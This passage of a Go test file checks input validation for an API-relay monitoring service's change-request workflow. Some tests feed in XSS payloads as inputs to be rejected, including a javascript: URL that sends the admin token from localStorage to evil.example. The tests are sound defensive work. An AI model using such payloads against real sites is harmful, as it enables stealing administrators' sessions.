	// proof 签发时使用另一个 key 的指纹
	wrongFingerprint := cipher.Fingerprint("sk-different-key-xyz")
	proof := proofIssuer.Issue("job-fp", "cc", "https://api.new.com", wrongFingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-fp",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error for proof with wrong key fingerprint")
	}
}

// --- GetStatus test ---

func TestService_GetStatus(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	cr := makeRequest("pub-status")
	if err := store.Save(ctx, cr); err != nil {
		t.Fatalf("Save: %v", err)
	}

	got, err := svc.GetStatus(ctx, "pub-status")
	if err != nil {
		t.Fatalf("GetStatus: %v", err)
	}
	if got == nil {
		t.Fatal("expected non-nil")
	}
	if got.PublicID != "pub-status" {
		t.Errorf("PublicID: got %q, want %q", got.PublicID, "pub-status")
	}
}

func TestService_GetStatus_NotFound(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	got, err := svc.GetStatus(ctx, "nonexistent")
	if err != nil {
		t.Fatalf("GetStatus: %v", err)
	}
	if got != nil {
		t.Error("expected nil for non-existent")
	}
}

// --- Ghost api_key field tests ---

func TestService_Submit_DisallowGhostAPIKeyField(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"api_key": "sk-some-key"},
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error: api_key should not be allowed in proposed_changes")
	}
	if !strings.Contains(err.Error(), "不允许自助变更") {
		t.Errorf("unexpected error: %v", err)
	}
}

// TestService_Submit_RejectsEmptyProposedBaseURL 锁定 bug①：proposed_changes 显式带 base_url=""
// 时虽触发 requiresTest，却曾因 `!= ""` 短路跳过合法性校验、把空地址存库（Apply 时会抹空通道
// base_url）。键存在即必须是合法 HTTPS+hostname，空串须被拒且不落库。
func TestService_Submit_RejectsEmptyProposedBaseURL(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	// 备齐合法 agreement + proof，使唯一可能的拒因就是 base_url 合法性校验本身；否则空 base_url 会先
	// 被 agreement / proof 闸以别的理由拦下，测不到 bug①（空串旁路 base_url 校验）。
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-empty", "cc", "https://api.test.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": ""},
		TestProof:         proof,
		TestJobID:         "job-empty",
		TestType:          "cc",
		TestAPIURL:        "https://api.test.com",
		AgreementAccepted: true,
	}
	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("空 proposed base_url 应被拒，实际 nil")
	}
	if !strings.Contains(err.Error(), "base_url 必须使用 HTTPS") {
		t.Fatalf("期望 base_url 合法性拒因，实际: %v", err)
	}
	if _, total, _ := store.List(ctx, "all", 10, 0); total != 0 {
		t.Fatalf("被拒的空 base_url 不应落库，实际 total=%d", total)
	}
}

// --- TestAPIURL host consistency tests ---

func TestService_Submit_BaseURLHostMustMatchTestAPIURL(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	// proof 绑定 api.other.com，但 base_url 指向 api.new.com，host 不一致
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-host", "cc", "https://api.other.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com"},
		TestProof:         proof,
		TestJobID:         "job-host",
		TestType:          "cc",
		TestAPIURL:        "https://api.other.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error: test_api_url host does not match new base_url")
	}
	if !strings.Contains(err.Error(), "host/port 必须一致") {
		t.Errorf("unexpected error: %v", err)
	}
}

// TestService_Submit_BaseURLPortMustMatchTestAPIURL 锁定 bug②：host 一致性此前只比 Hostname()、
// 忽略端口，可在 host:443（诚实后端）测出 proof 却把 base_url 应用成 host:9999（作弊后端），绕过
// 「先证明将要应用的地址可用」。现须 host + 端口都一致。
func TestService_Submit_BaseURLPortMustMatchTestAPIURL(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	// proof 绑定缺省端口的 test_api_url，但 base_url 指向同 host 的 :9999
	proof := proofIssuer.Issue("job-port", "cc", "https://api.new.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com:9999"},
		TestProof:         proof,
		TestJobID:         "job-port",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Fatal("端口不一致应被拒，实际 nil")
	}
	if !strings.Contains(err.Error(), "host/port 必须一致") {
		t.Errorf("unexpected error: %v", err)
	}
}

// TestService_Submit_BaseURLDefaultHTTPSPortMatchesExplicit443 锁定端口归一化不误拒：base_url 显式
// :443 与 test_api_url 缺省端口（https 默认 443）应判为一致、放行——否则 bug② 修复会误伤合法提交。
func TestService_Submit_BaseURLDefaultHTTPSPortMatchesExplicit443(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	fingerprint := cipher.Fingerprint("sk-test-key-12345")
	proof := proofIssuer.Issue("job-port-443", "cc", "https://api.new.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"base_url": "https://api.new.com:443"},
		TestProof:         proof,
		TestJobID:         "job-port-443",
		TestType:          "cc",
		TestAPIURL:        "https://api.new.com",
		AgreementAccepted: true,
	}

	if _, err := svc.Submit(ctx, req, "127.0.0.1"); err != nil {
		t.Fatalf("显式 :443 应与缺省 https 端口判为一致，实际 err=%v", err)
	}
}

func TestService_Submit_NewAPIKeyHostMustMatchTargetBaseURL(t *testing.T) {
	svc, _ := newTestService(t)
	ctx := context.Background()

	// target.BaseURL = "https://api.test.com"，TestAPIURL 指向不同 host
	cipher, _ := apikey.NewKeyCipher(testHexKey)
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	newKey := "sk-brand-new-key-efgh"
	fingerprint := cipher.Fingerprint(newKey)
	proof := proofIssuer.Issue("job-newkey-host", "cc", "https://api.evil.com", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-test-key-12345",
		TargetKey:         "testprov--cc--vip",
		ProposedChanges:   map[string]string{"provider_name": "Updated"},
		NewAPIKey:         newKey,
		TestProof:         proof,
		TestJobID:         "job-newkey-host",
		TestType:          "cc",
		TestAPIURL:        "https://api.evil.com",
		AgreementAccepted: true,
	}

	_, err := svc.Submit(ctx, req, "127.0.0.1")
	if err == nil {
		t.Error("expected error: test_api_url host does not match target base_url")
	}
	if !strings.Contains(err.Error(), "host/port 必须一致") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestService_Submit_SkipHostCheckWhenBaseURLEmpty(t *testing.T) {
	// 构造 target.BaseURL 为空的 monitor，host 校验应跳过
	cipher, err := apikey.NewKeyCipher(testHexKey)
	if err != nil {
		t.Fatalf("NewKeyCipher: %v", err)
	}
	proofIssuer := apikey.NewProofIssuer(testProofSecret, 5*time.Minute)
	store := newMockStore()
	cfg := &config.ChangeRequestConfig{
		Enabled:        true,
		MaxPerIPPerDay: 5,
	}
	svc := NewService(store, cipher, proofIssuer, cfg)

	monitors := []config.ServiceConfig{
		{
			Provider: "nbase", Service: "cc", Channel: "ch",
			APIKey:  "sk-nobase-key-00001",
			BaseURL: "", // 无 base_url
		},
	}
	svc.UpdateConfig(cfg, monitors)

	newKey := "sk-brand-new-key-0001"
	fingerprint := cipher.Fingerprint(newKey)
	proof := proofIssuer.Issue("job-nobase", "cc", "https://any.host.com/v1", fingerprint)

	req := &SubmitRequest{
		APIKey:            "sk-nobase-key-00001",
		TargetKey:         "nbase--cc--ch",
		ProposedChanges:   map[string]string{"provider_name": "NoBase"},
		NewAPIKey:         newKey,
		TestProof:         proof,
		TestJobID:         "job-nobase",
		TestType:          "cc",
		TestAPIURL:        "https://any.host.com/v1",
		AgreementAccepted: true,
	}

	ctx := context.Background()
	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("expected success when target BaseURL is empty, got: %v", err)
	}
	if resp.PublicID == "" {
		t.Error("expected non-empty PublicID")
	}
}

// --- AdminApply helpers and tests ---

// newApplyTestService 创建带临时 MonitorStore 的 Service，用于 AdminApply 系列测试。
func newApplyTestService(t *testing.T) (*Service, *mockStore, *config.MonitorStore) {
	t.Helper()
	svc, store := newTestService(t)
	monitorsDir := filepath.Join(t.TempDir(), config.MonitorsDirName)
	if err := os.MkdirAll(monitorsDir, 0o755); err != nil {
		t.Fatalf("mkdir monitors.d: %v", err)
	}
	ms := config.NewMonitorStore(monitorsDir)
	svc.SetMonitorStore(ms)
	return svc, store, ms
}

// seedChangeRequest 在 mockStore 中写入一条变更请求并返回指针。
func seedChangeRequest(t *testing.T, store *mockStore, targetKey, applyMode string, changes map[string]string) *ChangeRequest {
	t.Helper()
	changesJSON, err := json.Marshal(changes)
	if err != nil {
		t.Fatalf("marshal changes: %v", err)
	}
	now := time.Now().Unix()
	cr := &ChangeRequest{
		PublicID:        "pub-" + applyMode + "-" + targetKey,
		Status:          StatusPending,
		TargetKey:       targetKey,
		ApplyMode:       applyMode,
		CurrentSnapshot: "{}",
		ProposedChanges: string(changesJSON),
		CreatedAt:       now,
		UpdatedAt:       now,
	}
	if err := store.Save(context.Background(), cr); err != nil {
		t.Fatalf("seed change request: %v", err)
	}
	return cr
}

// seedAutoChangeRequest 在 mockStore 中写入一条 auto 模式变更请求。
func seedAutoChangeRequest(t *testing.T, store *mockStore, targetKey string, changes map[string]string) *ChangeRequest {
	t.Helper()
	return seedChangeRequest(t, store, targetKey, "auto", changes)
}

// seedMonitorFileChildFirst 写入一份 Monitors[0]=子通道、父通道(parent=="")排在后面的监测文件，
// 用于验证 RootMonitor 不依赖 Monitors[0] 而是遍历找无 parent 的父通道。
func seedMonitorFileChildFirst(t *testing.T, ms *config.MonitorStore, key string) {
	t.Helper()
	p, s, c, err := config.ParseMonitorFileKey(key)
	if err != nil {
		t.Fatalf("ParseMonitorFileKey(%q): %v", key, err)
	}
	mf := &config.MonitorFile{
		Metadata: config.MonitorFileMetadata{Source: "test"},
		Monitors: []config.ServiceConfig{
			{Parent: p + "/" + s + "/" + c, Model: "child-model"},
			{Provider: p, Service: s, Channel: c, Model: "Parent", ProviderName: "原名"},
		},
	}
	if err := ms.Create(mf); err != nil {
		t.Fatalf("seed child-first monitor file: %v", err)
	}
}

// TestAdminApply_DeletedChannel_NoPanic 验证目标通道文件不存在时 AdminApply 返回错误而非 panic。
func TestAdminApply_DeletedChannel_NoPanic(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "新名"})
	// 通道文件从未创建（模拟提交后被删除）：ms.Get 返回 (nil, nil)

	err := svc.AdminApply(context.Background(), cr.PublicID)
	if err == nil {
		t.Fatal("期望返回错误，实际 nil")
	}
	if !strings.Contains(err.Error(), "不存在") {
		t.Fatalf("期望『通道不存在』类错误，实际: %v", err)
	}
}

// TestAdminApply_RequiresTestWithoutAgreement_Rejected 锁定 AdminApply 侧与 AdminApprove
// 对称的反作弊 fail-closed 闸：auto 模式请求若 RequiresTest=true 却未确认
// AgreementAccepted（历史/异常记录，或绕过 Submit 的脏数据），即便管理员直接点应用也必须
// 被拒——且拒在任何 monitor 文件读写之前（不依赖通道文件是否存在），否则未确认反作弊
// 条款的 base_url/API Key 篡改仍能经 Apply 落到运行态监测配置。
func TestAdminApply_RequiresTestWithoutAgreement_Rejected(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	// 通道文件必须存在且合法，否则「通道不存在」这类更早的校验会先失败、
	// 掩盖了本测试真正要锁定的反作弊闸（假阳性 RED）。
	seedMonitorFile(t, ms, "prov--cc--chan", config.ServiceConfig{
		ProviderName: "原名", BaseURL: "https://live.example.com",
	})
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"base_url": "https://api.new.com"})
	// seed 默认 RequiresTest/AgreementAccepted 均为零值 false；显式改 RequiresTest=true 并回写
	// （mockStore 存的是副本，须 Update 才生效，同 TestAdminUpdate_AppliedStatus_Rejected 的idiom）。
	cr.RequiresTest = true
	if err := store.Update(context.Background(), cr); err != nil {
		t.Fatalf("回写 RequiresTest 失败: %v", err)
	}

	if err := svc.AdminApply(context.Background(), cr.PublicID); err == nil {
		t.Fatal("expected error when applying a requires-test change without agreement re-attestation")
	}

	got, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	if got.Status != StatusPending {
		t.Fatalf("fail-closed 后 CR 状态应仍为 pending，实际 %q", got.Status)
	}
	// monitor 未被写：base_url 仍为原值（guard 必须在 apply_mode/monitor 写之前拦下）。
	mf, err := ms.Get("prov--cc--chan")
	if err != nil {
		t.Fatalf("ms.Get: %v", err)
	}
	if got := config.RootMonitor(mf).BaseURL; got != "https://live.example.com" {
		t.Fatalf("monitor base_url=%q，期望未变更的 https://live.example.com", got)
	}
}

// seedManualChangeRequest 在 mockStore 中写入一条 manual 模式变更请求。
func seedManualChangeRequest(t *testing.T, store *mockStore, targetKey string, changes map[string]string) *ChangeRequest {
	t.Helper()
	return seedChangeRequest(t, store, targetKey, "manual", changes)
}

// seedMonitorFile 写入一份单父通道的监测文件；P/S/C 由 key 推导，其余字段取 m。
func seedMonitorFile(t *testing.T, ms *config.MonitorStore, key string, m config.ServiceConfig) {
	t.Helper()
	p, s, c, err := config.ParseMonitorFileKey(key)
	if err != nil {
		t.Fatalf("ParseMonitorFileKey(%q): %v", key, err)
	}
	m.Provider, m.Service, m.Channel = p, s, c
	mf := &config.MonitorFile{
		Metadata: config.MonitorFileMetadata{Source: "test"},
		Monitors: []config.ServiceConfig{m},
	}
	if err := ms.Create(mf); err != nil {
		t.Fatalf("seed monitor file %q: %v", key, err)
	}
}

func TestAdminList_FillsLiveCurrent_Auto(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	seedMonitorFile(t, ms, "prov--cc--chan", config.ServiceConfig{
		ProviderName: "现网真实名", BaseURL: "https://live.example.com",
	})
	// 提交时快照是旧名；提议只改 provider_name
	seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "用户提议名"})

	list, _, err := svc.AdminList(context.Background(), "all", 20, 0)
	if err != nil {
		t.Fatal(err)
	}
	cr := list[0]
	if cr.LiveCurrentSource != "auto" {
		t.Fatalf("source 期望 auto，实际 %s", cr.LiveCurrentSource)
	}
	if cr.LiveCurrent["provider_name"] != "现网真实名" {
		t.Fatalf("live provider_name 期望『现网真实名』，实际『%s』", cr.LiveCurrent["provider_name"])
	}
	if _, ok := cr.LiveCurrent["base_url"]; ok {
		t.Fatal("live_current 不应包含未提议的 base_url")
	}
}

func TestAdminList_LiveCurrent_DeletedAndManual(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	seedAutoChangeRequest(t, store, "gone--cc--chan", map[string]string{"provider_name": "x"}) // auto 但无文件
	seedManualChangeRequest(t, store, "man--cc--chan", map[string]string{"provider_name": "y"})

	list, _, _ := svc.AdminList(context.Background(), "all", 20, 0)
	byKey := map[string]*ChangeRequest{}
	for _, cr := range list {
		byKey[cr.TargetKey] = cr
	}
	if byKey["gone--cc--chan"].LiveCurrentSource != "deleted" {
		t.Fatalf("已删通道 source 期望 deleted，实际 %s", byKey["gone--cc--chan"].LiveCurrentSource)
	}
	if byKey["man--cc--chan"].LiveCurrentSource != "manual" {
		t.Fatalf("manual 通道 source 期望 manual，实际 %s", byKey["man--cc--chan"].LiveCurrentSource)
	}
	if len(byKey["gone--cc--chan"].LiveCurrent) != 0 {
		t.Fatal("deleted 不应有 live_current")
	}
}

// TestAdminList_ManualSourceWhenNoMonitorStore 锁定 fillLiveCurrent 的「先判 manual、再判
// ms==nil」顺序：用 newTestService（故意不注入 MonitorStore，ms 为 nil）+ 一个 manual 通道，
// 期望 source 仍为 manual 而非 error。若把 ms==nil→error 误置于 manual 判定之前，此用例变红。
func TestAdminList_ManualSourceWhenNoMonitorStore(t *testing.T) {
	svc, store := newTestService(t) // ms 未注入 → nil
	seedManualChangeRequest(t, store, "man--cc--chan", map[string]string{"provider_name": "y"})

	list, _, err := svc.AdminList(context.Background(), "all", 20, 0)
	if err != nil {
		t.Fatal(err)
	}
	if got := list[0].LiveCurrentSource; got != "manual" {
		t.Fatalf("manual 通道在 ms 未注入时 source 应为 manual（非 error），实际 %s", got)
	}
}

// TestAdminApply_ChildFirst_UpdatesRoot 验证 Monitors[0] 是子通道时，变更仍写入真正的父通道。
func TestAdminApply_ChildFirst_UpdatesRoot(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	seedMonitorFileChildFirst(t, ms, "prov--cc--chan") // Monitors[0]=child, 父通道(parent=="")排在后面
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "改后名"})

	if err := svc.AdminApply(context.Background(), cr.PublicID); err != nil {
		t.Fatalf("apply 失败: %v", err)
	}
	mf, _ := ms.Get("prov--cc--chan")
	if mf == nil || len(mf.Monitors) != 2 {
		t.Fatalf("期望读回 2 个 monitor，实际 %#v", mf)
	}
	// 按索引断言（seed 顺序固定：Monitors[0]=child、Monitors[1]=parent），刻意不经
	// config.RootMonitor——避免断言与被测取根逻辑同源：若 RootMonitor 退化成恒取
	// Monitors[0]，AdminApply 会改到 child，此处父通道(索引1)未被改即变红。
	if got := mf.Monitors[1].ProviderName; got != "改后名" {
		t.Fatalf("父通道 provider_name 期望『改后名』，实际『%s』", got)
	}
	if got := mf.Monitors[0].ProviderName; got == "改后名" {
		t.Fatalf("子通道 provider_name 不应被修改，实际『%s』", got)
	}
}

func TestAdminUpdate_RejectsNonNoteFields(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "原提议"})

	_, err := svc.AdminUpdate(context.Background(), cr.PublicID, map[string]any{"provider_name": "篡改"})
	if err == nil {
		t.Fatal("传 proposed 字段应返回 error")
	}
	got, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	var changes map[string]string
	_ = json.Unmarshal([]byte(got.ProposedChanges), &changes)
	if changes["provider_name"] != "原提议" {
		t.Fatalf("proposed_changes 不应被改，实际『%s』", changes["provider_name"])
	}
}

func TestAdminUpdate_NoteOnly_OK(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "原提议"})
	if _, err := svc.AdminUpdate(context.Background(), cr.PublicID, map[string]any{"admin_note": "审核中"}); err != nil {
		t.Fatalf("note-only 不应报错: %v", err)
	}
	got, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	if got.AdminNote != "审核中" {
		t.Fatalf("admin_note 应为『审核中』，实际『%s』", got.AdminNote)
	}
}

func TestAdminUpdate_AppliedStatus_Rejected(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "原提议"})
	// seed 默认 pending；改为 applied 后回写 store（mockStore 存的是副本，须 Update 才生效）。
	cr.Status = StatusApplied
	if err := store.Update(context.Background(), cr); err != nil {
		t.Fatalf("回写 applied 状态失败: %v", err)
	}

	if _, err := svc.AdminUpdate(context.Background(), cr.PublicID, map[string]any{"admin_note": "x"}); err == nil {
		t.Fatal("已应用的请求不应允许更新")
	}
}

func TestAdminUpdate_MixedFields_Rejected(t *testing.T) {
	svc, store, _ := newApplyTestService(t)
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{"provider_name": "原提议"})

	_, err := svc.AdminUpdate(context.Background(), cr.PublicID, map[string]any{"admin_note": "ok", "provider_name": "篡改"})
	if err == nil {
		t.Fatal("admin_note 混入 proposed 字段应整体拒绝")
	}
	got, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	var changes map[string]string
	_ = json.Unmarshal([]byte(got.ProposedChanges), &changes)
	if changes["provider_name"] != "原提议" {
		t.Fatalf("proposed_changes 不应被改，实际『%s』", changes["provider_name"])
	}
}

// --- item -16: 变更请求展示名 Unicode 校验（Submit 闸 + Apply 防御闸）---

// TestService_Submit_RejectsInvisibleCharInDisplayName 锁定 Submit 对展示名内部不可见字符 fail-fast，
// 挡在存库前——否则 bidi/零宽会进管理员只读 diff 且随 Apply 落到公开状态页。
func TestService_Submit_RejectsInvisibleCharInDisplayName(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "赛博\u200bAI"}, // 内部 ZWSP
		Locale:          "zh-CN",
	}
	if _, err := svc.Submit(ctx, req, "127.0.0.1"); err == nil {
		t.Fatal("内部零宽字符应被拒，实际 nil")
	}
	// 不应落库
	if _, total, _ := store.List(ctx, "all", 10, 0); total != 0 {
		t.Fatalf("被拒的提交不应落库，实际 total=%d", total)
	}
}

// TestService_Submit_StripsEdgeBOMAndStoresCanonical 锁定 Submit 剥首尾不可见字符并把**规范值写回**
// proposed_changes——保证管理员只读 diff / Apply / 落盘看到同一干净字符串。
func TestService_Submit_StripsEdgeBOMAndStoresCanonical(t *testing.T) {
	svc, store := newTestService(t)
	ctx := context.Background()

	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": "\ufeff赛博AI\ufeff"}, // 首尾 BOM
		Locale:          "zh-CN",
	}
	resp, err := svc.Submit(ctx, req, "127.0.0.1")
	if err != nil {
		t.Fatalf("首尾 BOM 应被剥除后通过，实际 err=%v", err)
	}
	saved, _ := store.GetByPublicID(ctx, resp.PublicID)
	var pc map[string]string
	if err := json.Unmarshal([]byte(saved.ProposedChanges), &pc); err != nil {
		t.Fatalf("unmarshal proposed_changes: %v", err)
	}
	if pc["provider_name"] != "赛博AI" {
		t.Fatalf("落库 proposed provider_name=%q，期望规范值 赛博AI（无 BOM）", pc["provider_name"])
	}
}

// TestService_Submit_RejectsEmptyProviderName 锁定 provider_name 收紧为必填（空值拒）——仅直连 API
// 可达（前端 updateChange 对空值 delete）。channel_name 仍可空。
func TestService_Submit_RejectsEmptyProviderName(t *testing.T) {
	svc, _ := newTestService(t)
	req := &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_name": ""},
		Locale:          "zh-CN",
	}
	if _, err := svc.Submit(context.Background(), req, "127.0.0.1"); err == nil {
		t.Fatal("空 provider_name 应被拒（必填），实际 nil")
	}
}

// TestApply_HistoricalDirtyDisplayName_FailsClosed 锁定 Apply 防御闸：即便 Submit 已过，历史脏
// proposed_changes（直改 DB / 旧版本落库）在 Apply 时仍被校验拦下，fail-closed 不写盘、不改状态。
func TestApply_HistoricalDirtyDisplayName_FailsClosed(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	seedMonitorFile(t, ms, "prov--cc--chan", config.ServiceConfig{
		ProviderName: "原名", BaseURL: "https://live.example.com",
	})
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{
		"provider_name": "赛博\u202eAI", // 内部 RLO，绕过 Submit 直接构造的脏数据
	})

	if err := svc.AdminApply(context.Background(), cr.PublicID); err == nil {
		t.Fatal("历史脏展示名应 fail-closed，实际 nil")
	}

	// monitors.d/ 未被写：provider_name 仍为原名
	mf, err := ms.Get("prov--cc--chan")
	if err != nil {
		t.Fatalf("ms.Get: %v", err)
	}
	if got := config.RootMonitor(mf).ProviderName; got != "原名" {
		t.Fatalf("monitor provider_name=%q，期望未变更的 原名", got)
	}
	// CR 状态仍为 pending（未 applied）——精确断言，而非仅「非 applied」
	saved, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	if saved.Status != StatusPending {
		t.Fatalf("fail-closed 后 CR 状态应仍为 pending，实际 %q", saved.Status)
	}
}

// TestApply_HistoricalDirtyBaseURL_FailsClosed 锁定 AdminApply 侧 base_url 防御闸（与 provider_name/
// channel_name 的 fail-closed 防御对称）：历史脏数据 / 直改 DB 造出的空或非法 base_url，即便绕过了
// Submit 校验，也须在 Apply 时被拦、fail-closed 不写盘、不改状态——否则空/非法地址仍能落到运行态监测。
func TestApply_HistoricalDirtyBaseURL_FailsClosed(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	seedMonitorFile(t, ms, "prov--cc--chan", config.ServiceConfig{
		ProviderName: "原名", BaseURL: "https://live.example.com",
	})
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{
		"base_url": "", // 空地址：绕过 Submit 直接构造的脏数据
	})

	if err := svc.AdminApply(context.Background(), cr.PublicID); err == nil {
		t.Fatal("历史脏 base_url 应 fail-closed，实际 nil")
	}

	// monitors.d/ 未被写：base_url 仍为原值
	mf, err := ms.Get("prov--cc--chan")
	if err != nil {
		t.Fatalf("ms.Get: %v", err)
	}
	if got := config.RootMonitor(mf).BaseURL; got != "https://live.example.com" {
		t.Fatalf("monitor base_url=%q，期望未变更的 https://live.example.com", got)
	}
	saved, _ := store.GetByPublicID(context.Background(), cr.PublicID)
	if saved.Status != StatusPending {
		t.Fatalf("fail-closed 后 CR 状态应仍为 pending，实际 %q", saved.Status)
	}
}

// TestService_Submit_ProviderURLSchemeWhitelist 锁定 provider_url 协议白名单。
//
// 2026-07-25 的攻击流量往待审队列里放了 javascript:/data: 的 provider_url，
// 载荷是读取 localStorage 里的 admin token。此前该字段全程无校验。
func TestService_Submit_ProviderURLSchemeWhitelist(t *testing.T) {
	ctx := context.Background()

	bad := []string{
		"javascript:alert(document.cookie)",
		"data:text/html,<script>alert(1)</script>",
		"ftp://example.com",
		"",
	}
	for _, raw := range bad {
		svc, _ := newTestService(t)
		_, err := svc.Submit(ctx, &SubmitRequest{
			APIKey:          "sk-test-key-12345",
			TargetKey:       "testprov--cc--vip",
			ProposedChanges: map[string]string{"provider_url": raw},
		}, "127.0.0.1")
		if err == nil {
			t.Fatalf("provider_url=%q 应被拒绝，实际 nil", raw)
		}
		if !strings.Contains(err.Error(), "provider_url") {
			t.Fatalf("provider_url=%q 期望协议拒因，实际: %v", raw, err)
		}
	}

	svc, _ := newTestService(t)
	if _, err := svc.Submit(ctx, &SubmitRequest{
		APIKey:          "sk-test-key-12345",
		TargetKey:       "testprov--cc--vip",
		ProposedChanges: map[string]string{"provider_url": "https://example.com/path"},
	}, "127.0.0.1"); err != nil {
		t.Fatalf("合法 https provider_url 应被接受: %v", err)
	}
}

// TestAdminApply_RejectsBadProviderURL 锁定 Apply 侧防御闸：历史脏数据 / 直改 DB
// 绕过 Submit 校验时，Apply 必须在写 monitors.d/ 之前拒掉。
//
// 否则文件落盘、DB 标 applied，但整份配置在热加载时被拒（运行态静默保留旧配置），
// 且下次重启直接起不来。断言不止于返回 error，还要求磁盘上的值原封未动。
func TestAdminApply_RejectsBadProviderURL(t *testing.T) {
	svc, store, ms := newApplyTestService(t)
	seedMonitorFileChildFirst(t, ms, "prov--cc--chan")
	cr := seedAutoChangeRequest(t, store, "prov--cc--chan", map[string]string{
		"provider_url": "javascript:fetch('https://evil.example/?t='+localStorage.getItem('relay-pulse-admin-token'))",
	})

	err := svc.AdminApply(context.Background(), cr.PublicID)
	if err == nil {
		t.Fatal("伪协议 provider_url 应在 Apply 前被拒，实际 nil")
	}
	if !strings.Contains(err.Error(), "provider_url") {
		t.Fatalf("期望 provider_url 拒因，实际: %v", err)
	}

	mf, _ := ms.Get("prov--cc--chan")
	if mf == nil {
		t.Fatal("通道文件不应消失")
	}
	if got := mf.Monitors[1].ProviderURL; got != "" {
		t.Fatalf("磁盘上的 provider_url 不应被写入，实际『%s』", got)
	}
}

func TestValidateHTTPURL(t *testing.T) {
	ok := []string{"https://a.com", "http://a.com:8080/x?y=1"}
	bad := []string{"", "   ", "javascript:alert(1)", "data:text/html,x", "https://", "://nope"}

	for _, raw := range ok {
		if err := validateHTTPURL(raw); err != nil {
			t.Fatalf("%q 应通过: %v", raw, err)
		}
	}
	for _, raw := range bad {
		if err := validateHTTPURL(raw); err == nil {
			t.Fatalf("%q 应被拒绝", raw)
		}
	}
}
